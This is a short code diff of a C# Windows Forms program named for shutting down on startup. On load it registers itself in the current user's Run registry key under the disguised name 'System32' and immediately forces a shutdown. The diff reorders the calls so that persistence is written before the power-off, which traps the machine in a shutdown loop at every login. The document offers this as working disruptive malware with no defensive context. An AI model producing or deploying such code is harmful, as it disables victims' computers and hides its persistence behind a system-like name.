@@ -20,9 +20,9 @@ namespace shutdown_on_startup
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            System.Diagnostics.Process.Start("shutdown", "/s /t 0");
             RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             reg.SetValue("System32", Application.ExecutablePath.ToString());
+            System.Diagnostics.Process.Start("shutdown", "/s /t 0");
         }
     }
 }
